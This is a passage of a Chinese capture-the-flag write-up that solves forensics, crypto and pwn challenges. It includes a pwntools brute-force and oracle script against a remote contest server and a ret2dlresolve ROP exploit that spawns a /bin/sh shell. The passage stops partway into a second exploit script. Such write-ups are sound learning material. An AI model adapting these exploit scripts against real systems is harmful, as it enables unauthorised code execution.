    221628-533357-667392-449185-516428-718443-190674-375100
是一个bitlocker文件卷加密，使用diskginus打开输入恢复健即可打开，发现readme文件，就是flag
BitLocker磁碟机加密恢复密钥
恢复键用来从BitLocker保护下的驱动器中获取数据。
对比ID和恢复屏幕中显示的恢复键，可以确定这是一个有效的恢复键。
恢复密钥ID: `168F1291-82C1-4B`
整体恢复密钥ID: `168F1291-82C1-4BF2-B634-9CCCEC63E9ED`
BitLocker恢复键:
`221628 - 533357 - 667392 - 449185 - 516428 - 718443 - 190674 - 375100`
### 0x02 **MISC Blue Teaming**
解压后hex打开，发现7z文件头，解压得到mem.dump
volatility 查看文件，查找有关powershell的相关信息，最终搜索到powershell日志文件
evtx格式文件,将其导出，发现两端powershell代码，如下图，结果，发现上面的代码就是下面的结果，无果，winhex查看文件，结合联想到进程“申请注册表”，发现一段代码如下
​
​
尝试提交 ~
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication
### 0x03 **ExtremlySlow**
先从流量中提取latest文件，需要按照content-range字段重新组合，得到latest之后，使用010editor打开发现是pyc，检查了magic
number应该是3.10以上的版本，修改unpyc，添加了GEN_START、修复字典相关字节码处理，成功反编译出源码，分析源码可知需要输入26个字节的数据，打印RC4的密钥m得到[stegosaurus](https://github.com/AngelKitty/stegosaurus)字符串，推测应该是pyc隐写，使用[stegosaurus](https://github.com/AngelKitty/stegosaurus)工具，适配3.10后即可解出26字节数据。输入后打印c，即得到flag
pyc
    import sys
    from hashlib import sha256
    MOD = 256
    def KSA(key):
        key_length = len(key)
    # create the array "S"
        S = list(range(MOD))  # [0,1,2, ... , 255]
        j = 0
    for i in range(MOD):
            j = (j + S[i] + key[i % key_length]) % MOD
            S[i], S[j] = S[j], S[i]  # swap values
    return S
    def PRGA(S):
        i = 0
        j = 0
    while True:
            i = (i + 1) % MOD
            j = (j + S[i]) % MOD
            S[i], S[j] = S[j], S[i]  # swap values
            K = S[(S[i] + S[j]) % MOD]
    yield K
    def RC4(key):
        S = KSA(key)
    return PRGA(S)
    def xor(p, stream):
    return bytes(map(lambda x: x ^ stream.__next__(), p))
    if __name__ == '__main__':
        w = b'\xf6\xef\x10H\xa9\x0f\x9f\xb5\x80\xc1xd\xae\xd3\x03\xb2\x84\xc2\xb4\x0e\xc8\xf3<\x151\x19\n\x8f'
        e = b'$\r9\xa3\x18\xddW\xc9\x97\xf3\xa7\xa8R~'
        b = b'geo'
        s = b'}\xce`\xbej\xa2\x120\xb5\x8a\x94\x14{\xa3\x86\xc8\xc7\x01\x98\xa3_\x91\xd8\x82T*V\xab\xe0\xa1\x141'
        t = b"Q_\xe2\xf8\x8c\x11M}'<@\xceT\xf6?_m\xa4\xf8\xb4\xea\xca\xc7:\xb9\xe6\x06\x8b\xeb\xfabH\x85xJ3$\xdd\xde\xb6\xdc\xa0\xb8b\x961\xb7\x13=\x17\x13\xb1"
        m = {2: 115, 8: 97, 11: 117, 10: 114}
        n = {3: 119, 7: 116, 9: 124, 12: 127}
        m |= {x : x ^ n[x] for x in n}
        m |= ((i.bit_count(), i) for i in b)
        stream = RC4(list(map(lambda x: x[1], sorted(m.items()))))
    print(xor(w, stream).decode())
        p = sys.stdin.buffer.read(26)
        e = xor(e, stream)
        c = xor(p, stream)
    if sha256(c).digest() == s:
    print(xor(t, stream).decode())
    else:
    print(e.decode())
### 0x04 **ISO1995**
一个ISO文件，通过观察知道新的flagfolder的时间戳是错的。按道理讲，应该是指向oldflag的相应字符。每一个oldflag文件里有个字节。
观察后，发现时间戳fffffff后的数值为不同的，可以修改依据进行排序。排序后，将相应指向的字符拼起来，然后可以在其中发现flag。
其中from.txt是存取ffffffff后的两个字节，可以手动提取，很方便，如图
​
相应的排序后转化为字符
    file = open("tail","rb")
    src = file.read()
    out = []
    length = len(src)
    for i in range(0,length):
        if src[i] != 0:
            out.append(src[i])
    for i in out:
        print(chr(i),end='')
    two = []
    f = open("from.txt","r").read().split()
    for i in f:
        two.append(int(i,16))
    for i in two:
        print(chr(out[i]),end='')
### 0x05 **EzTime**
NTFS log文件，使用工具NTFS Log Tracker V1.2.exe将题目给的两个文件打开，能够导出一个文件LogFile.csv
找到这个文件，访问时间早于修改时间
​
提交文件名即可
2286333 {45EF6FFC-F0B6-4000-A7C0-8D1549355A8C}.png
{45EF6FFC-F0B6-4000-A7C0-8D1549355A8C}.png 2021/5/23 0:28 2021/5/23 0:32
2021/5/23 0:28 Update Resident Value 0x25 0
## CRY
###  guess_game
预计30秒左右得到flag
    每个不同的guess值会让第一个序列和第二个序列出现差距的特征不一样，所以在本地运行多次统计出固定的特征值即可，把接受的的数据和本地运行的数据进行对比即可确定guess值
    from pwn import*
    from hashlib import*
    import random
    import string
    import hashlib
    import sys
    from collections import deque
    import sys
    class generator:
        def __init__(self, key: list, iv: list, hint: bool, k=0, m=0):
            self.NFSR = deque()
            self.LFSR = deque()
            for i in range(80):
                self.NFSR.append(key[i])
            for i in range(64):
                self.LFSR.append(iv[i])
            for i in range(64, 80):
                self.LFSR.append(1)
            self.clock()
            if hint:
                s = self.NFSR + self.LFSR
                for i in range(k, k + m):
                    s[i] ^= 1
                self.NFSR = deque(list(s)[:80])
                self.LFSR = deque(list(s)[80:])
        def clock(self):
            for i in range(160):
                zi = self.PRGA()
                self.NFSR[79] ^= zi
                self.LFSR[79] ^= zi
        def PRGA(self):
            x0 = self.LFSR[3]
            x1 = self.LFSR[25]
            x2 = self.LFSR[46]
            x3 = self.LFSR[64]
            x4 = self.NFSR[63]
            hx = x1 ^ x4 ^ (x0 & x3) ^ (x2 & x3) ^ (x3 & x4) ^ (x0 & x1 & x2) ^ (x0 & x2 & x3) \
                 ^ (x0 & x2 & x4) ^ (x1 & x2 & x4) ^ (x2 & x3 & x4)
            zi = (self.NFSR[1] ^ self.NFSR[2] ^ self.NFSR[4] ^ self.NFSR[10] ^ self.NFSR[31] ^ self.NFSR[43] ^ self.NFSR[
                56]) ^ hx
            fx = self.LFSR[62] ^ self.LFSR[51] ^ self.LFSR[38] ^ self.LFSR[23] ^ self.LFSR[13] ^ self.LFSR[0]
            gx = self.LFSR[0] ^ self.NFSR[62] ^ self.NFSR[60] ^ self.NFSR[52] ^ self.NFSR[45] ^ self.NFSR[37] \
                 ^ self.NFSR[33] ^ self.NFSR[28] ^ self.NFSR[21] ^ self.NFSR[14] ^ self.NFSR[9] ^ self.NFSR[0] \
                 ^ (self.NFSR[63] & self.NFSR[60]) ^ (self.NFSR[37] & self.NFSR[33]) ^ (self.NFSR[15] & self.NFSR[9]) \
                 ^ (self.NFSR[60] & self.NFSR[52] & self.NFSR[45]) ^ (self.NFSR[33] & self.NFSR[28] & self.NFSR[21]) \
                 ^ (self.NFSR[63] & self.NFSR[45] & self.NFSR[28] & self.NFSR[9]) ^ (
                         self.NFSR[60] & self.NFSR[52] & self.NFSR[37] & self.NFSR[33]) \
                 ^ (self.NFSR[63] & self.NFSR[60] & self.NFSR[21] & self.NFSR[15]) ^ (
                         self.NFSR[63] & self.NFSR[60] & self.NFSR[52] & self.NFSR[45] & self.NFSR[37]) \
                 ^ (self.NFSR[33] & self.NFSR[28] & self.NFSR[21] & self.NFSR[15] & self.NFSR[9]) ^ (
                         self.NFSR[52] & self.NFSR[45] & self.NFSR[37] & self.NFSR[33] & self.NFSR[28] & self.NFSR[21])
            self.LFSR.popleft()
            self.LFSR.append(fx)
            self.NFSR.popleft()
            self.NFSR.append(gx)
            return zi
    def f():
        m1=[]
        m2=[]
        for kk in range(160):
            r=(2**160)-1
            s=(2**160)-1
            for j in range(20):
                guess=kk
                k = guess // 2
                m = guess % 10
                if m == 0:
                    m = 10
                key = bin(random.getrandbits(80))[2:].zfill(80)
                key = list(map(int, key))
                iv = bin(random.getrandbits(64))[2:].zfill(64)
                iv = list(map(int, iv))
                a = generator(key, iv, False)
                k1 = []
                for i in range(160):
                    k1.append(a.PRGA())
                k1 = int("".join(list(map(str, k1))), 2)
                b = generator(key, iv, True, k, m)
                k2 = []
                for i in range(160):
                    k2.append(b.PRGA())
                k2 = int("".join(list(map(str, k2))), 2)
                r=r&(k1^k2)
                s=s&(((2**160)-1)-k1^k2)
            r=bin(r)[2:].zfill(160)
            s=bin(s)[2:].zfill(160)
            l=[]
            for p in range(160):
                if(r[p]=='1'):
                    l.append(p)
            m1.append(l)
            l=[]
            for p in range(160):
                if(s[p]=='1'):
                    l.append(p)
            m2.append(l)
        return m1,m2
    m1,m2=f()
    def fd(s,m1,m2):
        flag1=1
        for i in range(160):
            flag=1
            tar=m1[i]
            for j in tar:
                if(s[j]!='1'):
                    flag=0
                    break
            tar=m2[i]
            for j in tar:
                if(s[j]!='0'):
                    flag=0
                    break
            if(flag):
                return i
    def att(s,f):
        c=[]
        for i in range(26):
            c.append(chr(i+0x41))
            c.append(chr(i+0x61))
        for i in range(10):
            c.append(chr(0x30+i))
        for i in c:
            for j in c:
                for k in c:
                    for m in c:
                        t=i+j+k+m
                        if(sha256(t.encode()+s).hexdigest()==f.decode()):
                            return t
    sh=remote("39.105.139.103","10002")
    a=sh.recv()
    sh.sendline(att(a[14:30],a[35:99]))
    for i in range(32):
        print(sh.recv().decode())
        print(sh.recvuntil("your:\n").decode())
        a=int(sh.recvuntil("\n",drop=True).decode(),10)
        b=int(sh.recvuntil("\n",drop=True).decode(),10)
        s=bin(a^b)[2:].zfill(160)
        sh.sendline(fd(s,m1,m2))
    print(sh.recv())
## PWN
### 0x01 **no_output**
ret2_dlresolve的模板题
    from roputils import *
    from pwn import process,remote
    from pwn import gdb
    from pwn import context
    #r = process('./no_input')
    r = remote('39.105.138.97',1234)
    context.log_level = 'debug'
    dynstr = 0x08048318
    payload = p32(0x0804C084)
    payload = payload.ljust(0x30,b'a')
    r.send(payload)
    payload = '\x00ello_boy'.ljust(0x20,'a')
    r.send(payload)
    r.sendline("-2147483648")
    r.sendline('-1')
    rop = ROP('./no_input')
    offset = 0x48+4
    bss_base = rop.section('.bss')
    buf = rop.fill(offset)
    buf += rop.call('read', 0, bss_base, 100)
    ## used to call dl_Resolve()
    buf += rop.dl_resolve_call(bss_base + 20, bss_base)
    r.send(buf)
    buf = rop.string('/bin/sh')
    buf += rop.fill(20, buf)
    ## used to make faking data, such relocation, Symbol, Str
    buf += rop.dl_resolve_data(bss_base + 20, 'system')
    buf += rop.fill(100, buf)
    r.send(buf)
    r.interactive()
###  0x02 baby_diary
2.29下的off-by-null构造，利用largebin残留的指针，需要小爆破一下。
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    from PwnContext import *